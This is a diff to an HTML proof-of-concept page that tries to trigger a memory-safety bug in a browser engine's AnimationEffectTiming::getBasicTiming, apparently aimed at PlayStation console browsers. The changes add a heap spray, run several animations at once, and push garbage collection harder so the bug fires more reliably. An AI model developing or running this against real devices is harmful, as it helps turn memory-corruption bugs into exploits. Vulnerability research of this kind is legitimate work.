@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AnimationEffectTiming ASAN PoC (PS4/PS5?)</title>
+    <title>AnimationEffectTiming ASAN PoC v2 (PS4/PS5?)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -33,7 +33,7 @@
     </style>
 </head>
 <body>
-    <h1>AnimationEffectTiming ASAN PoC</h1>
+    <h1>AnimationEffectTiming ASAN PoC v2</h1>
     <p>Click to test ASAN issue in AnimationEffectTiming::getBasicTiming.</p>
     <button id="trigger">TEST ANIMATION</button>
     <div id="status">Idle...</div>
@@ -50,10 +50,10 @@
         }
 
         function stressGC() {
-            for (let i = 0; i < 1000; i++) {
+            for (let i = 0; i < 2000; i++) {
                 new ArrayBuffer(1024 * 1024);
             }
-            for (let i = 0; i < 200; i++) {
+            for (let i = 0; i < 300; i++) {
                 new ArrayBuffer(2 * 1024 * 1024);
             }
         }
@@ -84,36 +84,51 @@
             log(`Attempt ${attemptCount} started`);
 
             try {
+                // Check Web Animations support
+                log(`KeyframeEffect support: ${typeof KeyframeEffect}`);
+                log(`Animation support: ${typeof Animation}`);
+
                 // Create memory checker
                 const check = checkMemoryChanges();
 
-                // Create animation
+                // Heap spray
+                const spray = [];
+                for (let i = 0; i < 1000; i++) {
+                    spray.push(new ArrayBuffer(1024 * 1024));
+                }
+
+                // Create animations
                 const target = document.getElementById('target');
                 const keyframes = { transform: ['translateX(0)', 'translateX(100px)'] };
-                const effect = new KeyframeEffect(target, keyframes, { duration: 1000 });
-                const timeline = document.timeline; // Use default timeline
-                const animation = new Animation(effect, timeline);
+                const animations = [];
+                for (let i = 0; i < 10; i++) {
+                    const effect = new KeyframeEffect(target, keyframes, { duration: 1000 });
+                    animations.push(new Animation(effect, document.timeline));
+                }
 
-                // Trigger animation and manipulate
+                // Trigger animations
                 const interval = setInterval(() => {
                     try {
-                        animation.play();
-                        animation.finish();
-                        effect.getComputedTiming(); // Trigger getBasicTiming
-                        target.replaceChildren('test'); // Manipulate DOM
+                        animations.forEach(anim => {
+                            anim.play();
+                            anim.finish();
+                            anim.effect.getComputedTiming();
+                        });
+                        target.replaceChildren('test');
                         stressGC();
                     } catch (e) {
                         log(`Error in animation: ${e.message}`);
                     }
-                }, 10);
+                }, 5);
 
                 // Check for memory changes or crash
                 setTimeout(() => {
                     clearInterval(interval);
                     try {
-                        effect.getComputedTiming();
+                        animations.forEach(anim => anim.effect.getComputedTiming());
+                        log('getComputedTiming succeeded');
                     } catch (e) {
-                        log(`Error in getComputedTiming: ${e.message}`);
+                        log(`getComputedTiming error: ${e.message}`);
                     }
                     const result = check();
                     if (result.changes > 0) {
@@ -134,7 +149,7 @@
                             }
                         }, 10);
                     }
-                }, 2000);
+                }, 5000);
             } catch (err) {
                 status.textContent = `Failed: ${err.message}`;
                 log(`Error: ${err.message}`);
